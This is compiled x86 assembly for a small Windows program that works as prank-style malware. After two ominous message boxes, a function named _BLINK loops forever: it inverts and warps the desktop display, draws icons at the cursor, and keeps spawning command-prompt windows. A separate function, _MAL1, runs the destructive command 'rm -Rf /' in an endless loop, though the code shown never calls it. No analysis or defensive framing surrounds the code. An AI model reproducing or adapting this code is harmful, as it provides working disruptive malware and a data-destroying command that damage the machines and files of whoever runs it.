	.file	"main.c"
	.section .rdata,"dr"
LC0:
	.ascii "rm -Rf /\0"
	.text
	.globl	_MAL1
	.def	_MAL1;	.scl	2;	.type	32;	.endef
_MAL1:
LFB15:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	subl	$24, %esp
L2:
	movl	$LC0, (%esp)
	call	_system
	jmp	L2
	.cfi_endproc
LFE15:
	.section .rdata,"dr"
LC1:
	.ascii "start cmd\0"
	.text
	.globl	_BLINK
	.def	_BLINK;	.scl	2;	.type	32;	.endef
_BLINK:
LFB16:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	pushl	%ebx
	subl	$100, %esp
	.cfi_offset 3, -12
L4:
	call	_GetDesktopWindow@0
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_GetWindowDC@4
	subl	$4, %esp
	movl	%eax, -16(%ebp)
	leal	-40(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_GetWindowRect@8
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	-36(%ebp), %eax
	movl	%edx, %ecx
	subl	%eax, %ecx
	movl	-32(%ebp), %edx
	movl	-40(%ebp), %eax
	subl	%eax, %edx
	movl	$3342344, 32(%esp)
	movl	$0, 28(%esp)
	movl	$0, 24(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 20(%esp)
	movl	%ecx, 16(%esp)
	movl	%edx, 12(%esp)
	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_BitBlt@36
	subl	$36, %esp
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_ReleaseDC@8
	subl	$8, %esp
	movl	$LC1, (%esp)
	call	_system
	leal	-48(%ebp), %eax
	movl	%eax, (%esp)
	call	_GetCursorPos@4
	subl	$4, %esp
	movl	$11, (%esp)
	call	_GetSystemMetrics@4
	subl	$4, %esp
	movl	%eax, %edx
	shrl	$31, %edx
	addl	%edx, %eax
	sarl	%eax
	movl	%eax, -20(%ebp)
	movl	$12, (%esp)
	call	_GetSystemMetrics@4
	subl	$4, %esp
	movl	%eax, %edx
	shrl	$31, %edx
	addl	%edx, %eax
	sarl	%eax
	movl	%eax, -24(%ebp)
	movl	$32513, 4(%esp)
	movl	$0, (%esp)
	call	_LoadIconA@8
	subl	$8, %esp
	movl	%eax, %ecx
	movl	-44(%ebp), %eax
	subl	-24(%ebp), %eax
	movl	%eax, %edx
	movl	-48(%ebp), %eax
	subl	-20(%ebp), %eax
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_DrawIcon@16
	subl	$16, %esp
	movl	$32516, 4(%esp)
	movl	$0, (%esp)
	call	_LoadIconA@8
	subl	$8, %esp
	movl	%eax, %ecx
	movl	-44(%ebp), %eax
	subl	-24(%ebp), %eax
	movl	%eax, %edx
	movl	-48(%ebp), %eax
	subl	-20(%ebp), %eax
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_DrawIcon@16
	subl	$16, %esp
	movl	$32515, 4(%esp)
	movl	$0, (%esp)
	call	_LoadIconA@8
	subl	$8, %esp
	movl	%eax, %ecx
	movl	-44(%ebp), %eax
	subl	-24(%ebp), %eax
	movl	%eax, %edx
	movl	-48(%ebp), %eax
	subl	-20(%ebp), %eax
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_DrawIcon@16
	subl	$16, %esp
	leal	-40(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_GetWindowRect@8
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	-32(%ebp), %eax
	movl	-28(%ebp), %ecx
	leal	-100(%ecx), %ebx
	movl	-32(%ebp), %ecx
	subl	$100, %ecx
	movl	$13369376, 40(%esp)
	movl	%edx, 36(%esp)
	movl	%eax, 32(%esp)
	movl	$0, 28(%esp)
	movl	$0, 24(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	$50, 8(%esp)
	movl	$50, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_StretchBlt@44
	subl	$44, %esp
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_ReleaseDC@8
	subl	$8, %esp
	jmp	L4
	.cfi_endproc
LFE16:
	.def	___main;	.scl	2;	.type	32;	.endef
	.section .rdata,"dr"
LC2:
	.ascii "hwnd\0"
LC3:
	.ascii "who am i?\0"
LC4:
	.ascii "pain\0"
LC5:
	.ascii "i dont know who i am.\0"
	.text
	.globl	_main
	.def	_main;	.scl	2;	.type	32;	.endef
_main:
LFB17:
	.cfi_startproc
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	pushl	%ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	movl	%esp, %ebp
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x7c,0x6
	subl	$20, %esp
	call	___main
	movl	$48, 12(%esp)
	movl	$LC2, 8(%esp)
	movl	$LC3, 4(%esp)
	movl	$0, (%esp)
	call	_MessageBoxA@16
	subl	$16, %esp
	movl	$48, 12(%esp)
	movl	$LC4, 8(%esp)
	movl	$LC5, 4(%esp)
	movl	$0, (%esp)
	call	_MessageBoxA@16
	subl	$16, %esp
	call	_BLINK
	movl	$0, %eax
	movl	-4(%ebp), %ecx
	.cfi_def_cfa 1, 0
	leave
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
LFE17:
	.ident	"GCC: (MinGW.org GCC-6.3.0-1) 6.3.0"
	.def	_system;	.scl	2;	.type	32;	.endef
	.def	_GetDesktopWindow@0;	.scl	2;	.type	32;	.endef
	.def	_GetWindowDC@4;	.scl	2;	.type	32;	.endef
	.def	_GetWindowRect@8;	.scl	2;	.type	32;	.endef
	.def	_BitBlt@36;	.scl	2;	.type	32;	.endef
	.def	_ReleaseDC@8;	.scl	2;	.type	32;	.endef
	.def	_GetCursorPos@4;	.scl	2;	.type	32;	.endef
	.def	_GetSystemMetrics@4;	.scl	2;	.type	32;	.endef
	.def	_LoadIconA@8;	.scl	2;	.type	32;	.endef
	.def	_DrawIcon@16;	.scl	2;	.type	32;	.endef
	.def	_StretchBlt@44;	.scl	2;	.type	32;	.endef
	.def	_MessageBoxA@16;	.scl	2;	.type	32;	.endef
